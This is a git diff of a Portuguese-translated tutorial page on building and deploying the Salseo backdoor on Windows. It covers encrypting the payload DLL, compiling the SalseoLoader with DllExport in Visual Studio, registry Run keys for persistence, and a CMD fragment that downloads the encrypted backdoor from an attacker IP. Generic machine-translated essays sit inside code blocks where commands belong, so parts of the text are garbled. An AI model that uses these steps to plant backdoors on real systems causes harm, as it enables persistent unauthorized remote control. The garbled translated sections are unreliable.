@@ -39,47 +39,38 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 # Backdoors em Windows
 
-Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle total sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são discutidas abaixo.
+Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são descritas abaixo.
 
-## 1. Backdoors baseados em porta
+## 1. Porta dos fundos do Registro do Windows
 
-Os backdoors baseados em porta são criados abrindo uma porta de comunicação em um sistema Windows comprometido. Isso permite que o invasor se conecte remotamente ao sistema usando essa porta e execute comandos ou acesse arquivos e recursos do sistema.
+Uma maneira comum de criar um backdoor em um sistema Windows é adicionar uma entrada de registro que execute um programa malicioso sempre que o sistema for iniciado. Isso pode ser feito adicionando uma chave de registro em uma das seguintes localizações:
 
-## 2. Backdoors baseados em serviço
+- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
+- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
 
-Os backdoors baseados em serviço são criados instalando um serviço malicioso no sistema Windows comprometido. Esse serviço é executado em segundo plano e permite que o invasor mantenha acesso persistente ao sistema, mesmo após reinicializações.
+## 2. Backdoors baseados em serviços
 
-## 3. Backdoors baseados em registro
+Outra técnica comum é criar um backdoor como um serviço do Windows. Isso envolve a criação de um serviço que é executado em segundo plano e pode ser configurado para iniciar automaticamente quando o sistema é inicializado. O serviço pode ser configurado para executar um programa malicioso ou fornecer um shell remoto para o invasor.
 
-Os backdoors baseados em registro são criados adicionando entradas maliciosas ao registro do sistema Windows comprometido. Essas entradas são configuradas para serem executadas sempre que o sistema é inicializado, permitindo que o invasor mantenha acesso persistente ao sistema.
+## 3. Backdoors baseados em arquivos DLL
 
-## 4. Backdoors baseados em arquivo
+Os arquivos DLL (Dynamic Link Library) são componentes do sistema operacional Windows que contêm código e dados compartilhados por vários programas. Um backdoor pode ser criado substituindo uma DLL legítima por uma versão modificada que executa código malicioso. Quando um programa legítimo é executado e carrega a DLL modificada, o código malicioso é executado em segundo plano.
 
-Os backdoors baseados em arquivo são criados adicionando um arquivo malicioso ao sistema Windows comprometido. Esse arquivo é configurado para ser executado sempre que o sistema é inicializado, permitindo que o invasor mantenha acesso persistente ao sistema.
+## 4. Backdoors baseados em drivers
 
-## 5. Backdoors baseados em DLL
+Os drivers são programas que permitem que o sistema operacional Windows se comunique com dispositivos de hardware. Um backdoor pode ser criado substituindo um driver legítimo por uma versão modificada que executa código malicioso. Quando o driver é carregado pelo sistema operacional, o código malicioso é executado em segundo plano.
 
-Os backdoors baseados em DLL são criados substituindo uma DLL legítima do sistema Windows comprometido por uma DLL maliciosa. Essa DLL maliciosa é carregada sempre que um programa usa a DLL legítima, permitindo que o invasor execute comandos ou acesse recursos do sistema.
+## 5. Backdoors baseados em aplicativos legítimos
 
-## 6. Backdoors baseados em chave de registro
+Uma técnica menos comum é modificar um aplicativo legítimo para incluir um backdoor. Isso pode ser feito modificando o código do aplicativo ou injetando código malicioso em tempo de execução. Quando o aplicativo é executado, o backdoor é ativado e permite ao invasor obter acesso não autorizado ao sistema.
 
-Os backdoors baseados em chave de registro são criados adicionando uma chave de registro maliciosa ao sistema Windows comprometido. Essa chave de registro é configurada para ser executada sempre que o sistema é inicializado, permitindo que o invasor mantenha acesso persistente ao sistema.
+## 6. Backdoors baseados em exploits
 
-## 7. Backdoors baseados em agendador de tarefas
+Os exploits são vulnerabilidades de segurança em sistemas operacionais ou aplicativos que podem ser exploradas para obter acesso não autorizado. Um backdoor pode ser criado aproveitando um exploit conhecido e explorando-o para obter acesso ao sistema. Isso geralmente requer conhecimento avançado de programação e segurança.
 
-Os backdoors baseados em agendador de tarefas são criados adicionando uma tarefa maliciosa ao agendador de tarefas do sistema Windows comprometido. Essa tarefa é configurada para ser executada em intervalos regulares, permitindo que o invasor mantenha acesso persistente ao sistema.
+## Conclusão
 
-## 8. Backdoors baseados em driver
-
-Os backdoors baseados em driver são criados instalando um driver malicioso no sistema Windows comprometido. Esse driver é carregado sempre que o sistema é inicializado, permitindo que o invasor execute comandos ou acesse recursos do sistema.
-
-## 9. Backdoors baseados em rootkit
-
-Os backdoors baseados em rootkit são criados instalando um rootkit no sistema Windows comprometido. Um rootkit é um conjunto de ferramentas e técnicas que permite ao invasor ocultar sua presença no sistema, tornando difícil a detecção e remoção do backdoor.
-
-## 10. Backdoors baseados em malware
-
-Os backdoors baseados em malware são criados instalando um malware no sistema Windows comprometido. Esse malware pode ser projetado para abrir uma porta de comunicação, instalar um serviço malicioso ou executar outras ações que permitem ao invasor manter acesso persistente ao sistema.
+Essas são apenas algumas das técnicas comuns usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra ataques e garantir a segurança de seus dados.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -135,17 +126,17 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
 
 Na pasta do seu projeto, aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
 
@@ -167,7 +158,7 @@ Selecione **x64** (se você for usá-lo em uma máquina x64, esse foi o meu caso
 
 ### **Abra o projeto novamente com o Visual Studio**
 
-**\[DllExport]** não deve mais estar marcado como erro
+**\[DllExport]** não deve mais ser marcado como erro
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
@@ -181,7 +172,7 @@ Selecione a **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Com
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, aparecerá o caminho da nova DLL)
+Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)
 
 ### Teste a DLL gerada
 
@@ -216,7 +207,7 @@ Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, c
 
 Para evitar o uso indevido do CMD, é recomendável implementar medidas de segurança, como restringir o acesso ao CMD, monitorar atividades suspeitas e manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança.
 
-Em resumo, o CMD é uma ferramenta poderosa que pode ser usada tanto para fins legítimos quanto maliciosos. É essencial entender seu funcionamento e tomar precauções adequadas para garantir a segurança do sistema.
+No entanto, é importante ressaltar que o CMD também é uma ferramenta legítima e útil para administradores de sistemas e usuários avançados. Portanto, seu uso deve ser feito com responsabilidade e dentro dos limites legais e éticos.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
